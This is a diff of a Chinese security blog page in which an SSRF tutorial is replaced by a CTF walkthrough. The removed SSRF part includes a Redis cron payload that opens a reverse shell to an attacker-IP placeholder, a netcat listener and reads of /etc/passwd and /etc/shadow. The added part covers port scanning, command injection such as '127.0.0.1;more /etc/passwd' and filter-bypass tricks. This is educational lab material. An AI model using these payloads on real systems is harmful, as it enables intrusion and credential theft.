@@ -13,23 +13,23 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="http://example.com/2024/09/11/服务器请求伪造（ssrf）/"/>
+    <link rel="canonical" href="http://example.com/2024/09/11/93f6ba8bb1f2/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="SSRF漏洞漏洞介绍服务器请求是从客户端发起一个请求到服务器，服务器再向另外的服务器发起请求的过程。 服务器端清求伪造(Server-side Request Forgery，简称SSRF)，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。SSRF让服务器去请求你通常请求不到的东西，一般用来在外网探测或攻击内网服务。	  **类比CSRF:**服务器端请求伪造攻击将域中的不安全服务器作为代理使">
+        <meta name="description" content="得到flag参考思路1.信息探测1.1 扫描信息12nmap -p- -T4 IP # 探测端口namp -T4 -A -v IP # 探测全部信息  1.2 探测敏感信息1234nikto -host http:&#x2F;&#x2F;ip:portdirb http:&#x2F;&#x2F;ip:port # 探测相关目录#两种方法的port不可省略，80可省略  2.深入挖掘1.1 http服务对于大端口非htp服务，可以使用nc">
 <meta property="og:type" content="article">
-<meta property="og:title" content="服务器请求伪造（SSRF）">
-<meta property="og:url" content="http://example.com/2024/09/11/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%88SSRF%EF%BC%89/index.html">
+<meta property="og:title" content="ctf 基本思路">
+<meta property="og:url" content="http://example.com/2024/09/11/93f6ba8bb1f2/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="SSRF漏洞漏洞介绍服务器请求是从客户端发起一个请求到服务器，服务器再向另外的服务器发起请求的过程。 服务器端清求伪造(Server-side Request Forgery，简称SSRF)，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。SSRF让服务器去请求你通常请求不到的东西，一般用来在外网探测或攻击内网服务。	  **类比CSRF:**服务器端请求伪造攻击将域中的不安全服务器作为代理使">
+<meta property="og:description" content="得到flag参考思路1.信息探测1.1 扫描信息12nmap -p- -T4 IP # 探测端口namp -T4 -A -v IP # 探测全部信息  1.2 探测敏感信息1234nikto -host http:&#x2F;&#x2F;ip:portdirb http:&#x2F;&#x2F;ip:port # 探测相关目录#两种方法的port不可省略，80可省略  2.深入挖掘1.1 http服务对于大端口非htp服务，可以使用nc">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2024-09-11T10:56:23.000Z">
-<meta property="article:modified_time" content="2024-09-12T00:17:46.222Z">
+<meta property="article:published_time" content="2024-09-11T10:56:47.000Z">
+<meta property="article:modified_time" content="2024-09-21T04:39:09.250Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="CTF">
-<meta property="article:tag" content="SSRF">
+<meta property="article:tag" content="common">
 <meta name="twitter:card" content="summary">
     
     
@@ -52,7 +52,7 @@
     
     <title>
         
-            服务器请求伪造（SSRF） -
+            ctf 基本思路 -
         
         Dunm1e &#39; s World
     </title>
@@ -491,7 +491,7 @@
 
         <div class="statistics flex justify-around my-2.5">
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">9</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">10</div>
         <div class="label text-third-text-color text-sm">Tags</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
@@ -499,7 +499,7 @@
         <div class="label text-third-text-color text-sm">Categories</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">11</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">12</div>
         <div class="label text-third-text-color text-sm">Posts</div>
     </a>
 </div>
@@ -525,7 +525,7 @@
         <div class="article-title relative w-full">
             
                 <div class="w-full flex items-center pt-6 justify-start">
-                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">服务器请求伪造（SSRF）</h1>
+                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">ctf 基本思路</h1>
                 </div>
             
             </div>
@@ -546,15 +546,15 @@
                         <div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2024-09-11 18:56:23</span>
-        <span class="mobile">2024-09-11 18:56:23</span>
+        <span class="desktop">2024-09-11 18:56:47</span>
+        <span class="mobile">2024-09-11 18:56:47</span>
         <span class="hover-info">Created</span>
     </span>
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-09-12 08:17:46</span>
-            <span class="mobile">2024-09-12 08:17:46</span>
+            <span class="desktop">2024-09-21 12:39:09</span>
+            <span class="mobile">2024-09-21 12:39:09</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -596,7 +596,7 @@
                     </li>
                 
                     <li>
-                        | <a href="/tags/SSRF/">SSRF</a>&nbsp;
+                        | <a href="/tags/common/">common</a>&nbsp;
                     </li>
                 
             </ul>
@@ -606,12 +606,12 @@
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>1.7k Words</span>
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>729 Words</span>
         </span>
     
     
         <span class="article-min2read article-meta-item">
-            <i class="fa-regular fa-clock"></i>&nbsp;<span>6 Mins</span>
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>2 Mins</span>
         </span>
     
     
@@ -630,53 +630,53 @@
 
 
         <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-            <h1 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h1><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p><strong>服务器请求</strong>是从客户端发起一个请求到服务器，服务器再向另外的服务器发起请求的过程。</p>
-<p><strong>服务器端清求伪造</strong>(Server-side Request Forgery，简称SSRF)，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。SSRF让服务器去请求你通常请求不到的东西，一般用来在外网探测或攻击内网服务。	 </p>
-<p>**类比CSRF:**服务器端请求伪造攻击将域中的不安全服务器作为代理使用，这与利用网页客户端的跨站请求伪造攻击类似(如处在域中的浏览器可作为攻击者的代理)。<br>**漏洞成因:**由于服务端提供了从其他服务器应用获取数据的功能，但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发送请求，并返回对该目标地址请求的数据。比如:攻击者传入一个未经验证的 URL，后端代码直接请求这个URL，就会造成 SSRF 漏洞。<br>**漏洞危害:**利用SSRF漏洞，攻击者实际上可以访问内网，可以进行</p>
-<ul>
-<li>读取内网文件;</li>
-<li>扫描内网服务和端口;</li>
-<li>收集内网 web 应用的指纹识别，根据这些信息进行下一步的渗透:</li>
-<li>攻击运行在内网的系统或应用程序.</li>
-</ul>
-<h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p><strong>漏洞点：</strong>能够对外发起网络请求的服务器，就可能存在SSRF漏洞</p>
-<p><strong>web功能</strong></p>
-<p>服务器端请求伪造漏洞是在服务端获取其他服务器的相关信息的功能中形成的，因此我们可以列举几种在web应用中常见的从服务端获取其他服务器信息的的功能:</p>
-<ol>
-<li>分享URL:通过目标URL地址获取了title标签和相关文本内容，而如果在此功能中没有对目标地址的范围做过滤与限制则就存在着SSRF漏洞。</li>
-<li>转码服务:通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览。</li>
-<li>在线翻译:通过URL地址翻译对应文本的内容。提供此功能的国内公司有百度、有道等。</li>
-<li>图片加载与下载:通过URL地址加载或下载图片。</li>
-<li>通过api获取远程地址文件来加载内容。</li>
-</ol>
-<p><strong>URL关键字</strong></p>
-<p>寻找需要加载外部资源的URL，可能存在SSRF漏洞。这些URL中经常包含的关键词有<code>share、wap、ur1、link、src、source、target、u、3g、display、sourceURL、imageURL、domain</code>等利用 google 语法(inurl:url&#x3D;)加上这些关键字去寻找 SSRF 漏洞，耐心的验证，可以找到存在的 SSRF漏洞。</p>
-<p><strong>判断漏洞是否存在：</strong>在目标网站上攻击者IP，如果攻击的服务器日志能看到目标服务器对自己发起的请求，说明存在漏洞。</p>
-<h2 id="SSRF利用"><a href="#SSRF利用" class="headerlink" title="SSRF利用"></a>SSRF利用</h2><h3 id="1-读取敏感文件"><a href="#1-读取敏感文件" class="headerlink" title="1. 读取敏感文件"></a>1. 读取敏感文件</h3><p>**file协议:**本地文件传输协议，用于访问本地计算机中的文件。好比通过Windows的资源管理器中打开文件或者通过右键单击打开一样。格式:file:&#x2F;&#x2F;filepath</p>
-<p><strong>重要文件：</strong></p>
-<ol>
-<li>&#x2F;etc&#x2F;passwd:在Linux中，&#x2F;etc&#x2F;passwd文件中一行记录对应着一个用户，每行记录又被冒号(:)分隔为7个字段:<code>用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录 shell</code></li>
-<li>&#x2F;etc&#x2F;shadow:用于存储 Linux 系统中用户的密码信息，只有 root 用户拥有读权限，其他用户没有任何权限。</li>
-<li>&#x2F;etc&#x2F;hosts:在linux中，主要作用是定义IP地址和主机名的映射关系，是一个映射IP地址和主机名的规定。可以用文本文件打开!当用户在浏览器中输入一个网址时，系统会首先自动从hosts文件中寻找对应的IP地址，一旦找到，浏览器会立即打开对应网页，如果没有找到，则浏览器会将网址提交DNS服务器进行IP地址解析。</li>
-</ol>
-<h3 id="2-探测内网服务"><a href="#2-探测内网服务" class="headerlink" title="2. 探测内网服务"></a>2. 探测内网服务</h3><p>**dict协议:**一个字典服务器协议，在ssrf中常用于探测日标服务器端口上运行的服务版本信息。格式:dict:&#x2F;&#x2F;ip:port。先利用file协议读取&#x2F;etc&#x2F;hosts获取ip，通过 dict 协议读取目标服务器端口上运行的服务版本信息</p>
-<p>探测内网存活IP和开放端口:可利用BurpSuite，批量探测存活IP和开放端口。</p>
-<ol>
-<li><p>开启Burpsuite，并访问待测试的网站:<a class="link"   target="_blank" rel="noopener" href="http://120.27.61.239:8006/source/index.php" >http://120.27.61.239:8006/source/index.php <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>;</p>
-</li>
-<li><p>将抓到的包发送到Intruder模块，设置IP或者端口，进行爆破;</p>
-</li>
-</ol>
-<p><strong>探测内网redis：</strong>REmote Dlctionary Server(Redis)是一个由 Salvatore Sanfilippo 写的 key-value 存储系统，是跨平台的非关系型数据库。Redis一般绑定在本地(不允许远程访问)，默认不开启认证，默认端口为6379。如果在没有开启认证的情况下，可以导致任意用户利用ssrf漏洞攻击内网中的未授权Redis以及读取Redis的数据。使用dict:&#x2F;&#x2F;127.0.0.1:6379 有返回信息，说明存在redis数据库</p>
-<p>同样可以利用Burp进行爆破</p>
-<h3 id="3-攻击内网应用"><a href="#3-攻击内网应用" class="headerlink" title="3. 攻击内网应用"></a>3. 攻击内网应用</h3><p>攻击者在未授权访问Redis的情况下可以利用Redis的相关方法，如果运行redis 的用户是root 用户，攻击者可以通过写<strong>定时任务</strong>的方式进行反弹shell。<br>定时任务类似日常生活之中的闹钟，主要用于定时执行某些命令，达到定时处理数据的作用。不同的系统定时任务保存位置不一样，比如:<br>centos(cat &#x2F;etc&#x2F;redhat-release)，在&#x2F;var&#x2F;spool&#x2F;cron&#x2F;日录下;<br>ubuntu(cat &#x2F;etc&#x2F;lsb-release)，在&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F; 目录下。</p>
-<p><strong>攻击payload:</strong></p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dict://127.0.0.1:6379/info //查看信息</span><br><span class="line">dict://127.0.0.1:6379/flusha11 //清空数据库(慎用)</span><br><span class="line">dict://127.0.0.1:6379/config set dir /var/spoo1/cron/ //设置工作目录</span><br><span class="line">dict://127.0.0.1:6379/config set dbfilename root //设置备份文件名</span><br><span class="line">dict://127.0.0.1:6379/set x &quot;\n***** bash -i &amp;&gt; /dev/tcp/攻击机IP/port 0&gt;&amp;1\n&quot;//反弹she11</span><br><span class="line">dict://127.0.0.1:6379/save</span><br></pre></td></tr></table></figure></div>
+            <h1 id="得到flag参考思路"><a href="#得到flag参考思路" class="headerlink" title="得到flag参考思路"></a>得到flag参考思路</h1><h2 id="1-信息探测"><a href="#1-信息探测" class="headerlink" title="1.信息探测"></a>1.信息探测</h2><h3 id="1-1-扫描信息"><a href="#1-1-扫描信息" class="headerlink" title="1.1 扫描信息"></a>1.1 扫描信息</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- -T4 IP <span class="comment"># 探测端口</span></span><br><span class="line">namp -T4 -A -v IP <span class="comment"># 探测全部信息</span></span><br></pre></td></tr></table></figure></div>
 
-<p>然后攻击机进行监听</p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp port</span><br></pre></td></tr></table></figure></div>
+<h3 id="1-2-探测敏感信息"><a href="#1-2-探测敏感信息" class="headerlink" title="1.2 探测敏感信息"></a>1.2 探测敏感信息</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nikto -host http://ip:port</span><br><span class="line"></span><br><span class="line">dirb http://ip:port <span class="comment"># 探测相关目录</span></span><br><span class="line"><span class="comment">#两种方法的port不可省略，80可省略</span></span><br></pre></td></tr></table></figure></div>
 
-<p>定时任务执行后就会反弹shell到攻击机</p>
+<h2 id="2-深入挖掘"><a href="#2-深入挖掘" class="headerlink" title="2.深入挖掘"></a>2.深入挖掘</h2><h3 id="1-1-http服务"><a href="#1-1-http服务" class="headerlink" title="1.1 http服务"></a>1.1 http服务</h3><p><strong>对于大端口非htp服务，可以使用nc来探测该端口的banner信息</strong></p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc IP port</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>对于大端口http服务，可以使用浏览器浏览界面查看源代码，寻找flag值</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip地址:端口号</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>在扫描的全部信息里寻找是否为http服务</p>
+</blockquote>
+<p><strong>对于http服务，打开相关敏感页面，查看敏感信息，找到可利用的位置（包括80端口）</strong></p>
+<p><strong>&#x3D;&#x3D;注意之前用dirb和nikto扫描出来的目录&#x3D;&#x3D;</strong></p>
+<p>注意到flag.txt，打开获得flag</p>
+<p>并且这里有个passwords.html，打开发现没有什么，但是我们&#x3D;&#x3D;查看源代码&#x3D;&#x3D;，<strong>发现一个password：Winter</strong>，记录下来</p>
+<h3 id="1-2-FTP服务"><a href="#1-2-FTP服务" class="headerlink" title="1.2 FTP服务"></a>1.2 FTP服务</h3><p><strong>FTP 匿名登陆 挖掘敏感信息</strong></p>
+<p>在浏览器输入</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp://IP</span><br></pre></td></tr></table></figure></div>
+
+<p> 匿名登录ftp服务器根目录</p>
+<p>发现flag</p>
+<p><strong>然后在站点robots.txt文件中寻找敏感文件目录，挖掘漏洞（在扫描的信息中查看）</strong></p>
+<p>&#x3D;&#x3D;注意：对于命令执行，为了绕过对应的限制，可以使用相近命令&#x3D;&#x3D;</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat -&gt; more</span><br></pre></td></tr></table></figure></div>
+
+<p>然后依次打开robots.txt中的目录</p>
+<p>发现命令执行窗口</p>
+<p>于是想到命令注入</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;id</span><br><span class="line"></span><br><span class="line">127.0.0.1;more /etc/passwd # cat不能用</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>1、命令注入我们要防备其对于一些符号的过滤导致我们不能成功注入，所以我们要多了解一些符号。<br>2、;直接分号分隔<br>管道符：作用和&amp;一样。前面和后面命令都要执行，无论前面真假<br>3、| 按位或<br>作用是直接执行|后面的语句<br>4、|| 逻辑或<br>作用是如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br>5、&amp; 按位与<br>&amp;前面和后面命令都要执行，无论前面真假<br>6、&amp;&amp; 逻辑与<br>如果前面为假，后面的命令就不执行，如果前面为真则再执行后面命令，这样两条命令都会被执行</p>
+</blockquote>
+<p>找到在home下的用户Summer</p>
+<p>然后利用ssh远程连接</p>
+<p>但是发现无法直接连接，看到扫描的端口号有个22222端口</p>
+<p>于是利用这个端口进行连接</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -p 22222 Summer@IP</span><br><span class="line"><span class="comment">#输入密码 Winter</span></span><br></pre></td></tr></table></figure></div>
+
+<p>于是得到反弹shell</p>
+<p>利用pwd ls cat more等命令</p>
+<p>查看flag</p>
+<h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><p>空格绕过：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 //1 改 成 1改成1改成加其他数字貌似都行</span><br><span class="line">&lt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&#123;cat,flag.php&#125; //用逗号实现了空格功能</span><br><span class="line">%20</span><br><span class="line">%09</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
 
         </div>
 
@@ -684,18 +684,18 @@
             <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
                 <div class="article-copyright-info-container">
     <ul>
-        <li><strong>Title:</strong> 服务器请求伪造（SSRF）</li>
+        <li><strong>Title:</strong> ctf 基本思路</li>
         <li><strong>Author:</strong> Dunm1e</li>
         <li><strong>Created at
-                :</strong> 2024-09-11 18:56:23</li>
+                :</strong> 2024-09-11 18:56:47</li>
         
             <li>
                 <strong>Updated at
-                    :</strong> 2024-09-12 08:17:46
+                    :</strong> 2024-09-21 12:39:09
             </li>
         
         <li>
-            <strong>Link:</strong> https://dunm1e.github.io/2024/09/11/服务器请求伪造（SSRF）/
+            <strong>Link:</strong> https://dunm1e.github.io/2024/09/11/93f6ba8bb1f2/
         </li>
         <li>
             <strong>
@@ -721,7 +721,7 @@
                     </li>
                 
                     <li class="tag-item mx-0.5">
-                        <a href="/tags/SSRF/">#SSRF</a>&nbsp;
+                        <a href="/tags/common/">#common</a>&nbsp;
                     </li>
                 
             </ul>
@@ -735,13 +735,13 @@
                     <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                         <a class="prev"
                         rel="prev"
-                        href="/2024/09/11/ctf-%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/"
+                        href="/2024/09/11/d77af8045ce5/"
                         >
                             <span class="left arrow-icon flex justify-center items-center">
                                 <i class="fa-solid fa-chevron-left"></i>
                             </span>
                             <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">ctf 基本思路</span>
+                                <span class="post-nav-title-item">万能登陆密码</span>
                                 <span class="post-nav-item">Prev posts</span>
                             </span>
                         </a>
@@ -751,10 +751,10 @@
                     <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                         <a class="next"
                         rel="next"
-                        href="/2024/09/11/ssh%E5%AF%86%E9%92%A5%E6%B3%84%E9%9C%B2/"
+                        href="/2024/09/11/fdbfb64754f6/"
                         >
                             <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">ssh密钥泄露</span>
+                                <span class="post-nav-title-item">服务器请求伪造（SSRF）</span>
                                 <span class="post-nav-item">Next posts</span>
                             </span>
                             <span class="right arrow-icon flex justify-center items-center">
@@ -817,8 +817,8 @@
             <div class="post-toc-wrap">
     <div class="post-toc">
         <div class="toc-title">On this page</div>
-        <div class="page-title">服务器请求伪造（SSRF）</div>
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SSRF%E6%BC%8F%E6%B4%9E"><span class="nav-text">SSRF漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D"><span class="nav-text">漏洞介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0"><span class="nav-text">漏洞发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF%E5%88%A9%E7%94%A8"><span class="nav-text">SSRF利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E8%AF%BB%E5%8F%96%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6"><span class="nav-text">1. 读取敏感文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%8E%A2%E6%B5%8B%E5%86%85%E7%BD%91%E6%9C%8D%E5%8A%A1"><span class="nav-text">2. 探测内网服务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8"><span class="nav-text">3. 攻击内网应用</span></a></li></ol></li></ol></li></ol>
+        <div class="page-title">ctf 基本思路</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BE%97%E5%88%B0flag%E5%8F%82%E8%80%83%E6%80%9D%E8%B7%AF"><span class="nav-text">得到flag参考思路</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B"><span class="nav-text">1.信息探测</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-%E6%89%AB%E6%8F%8F%E4%BF%A1%E6%81%AF"><span class="nav-text">1.1 扫描信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-%E6%8E%A2%E6%B5%8B%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF"><span class="nav-text">1.2 探测敏感信息</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E6%B7%B1%E5%85%A5%E6%8C%96%E6%8E%98"><span class="nav-text">2.深入挖掘</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-http%E6%9C%8D%E5%8A%A1"><span class="nav-text">1.1 http服务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-FTP%E6%9C%8D%E5%8A%A1"><span class="nav-text">1.2 FTP服务</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A"><span class="nav-text">知识点：</span></a></li></ol></li></ol>
 
     </div>
 </div>
@@ -853,11 +853,11 @@
                 
                 <p class="post-count space-x-0.5">
                     <span>
-                        11 posts in total
+                        12 posts in total
                     </span>
                     
                         <span>
-                            12.8k words in total
+                            13.3k words in total
                         </span>
                     
                 </p>
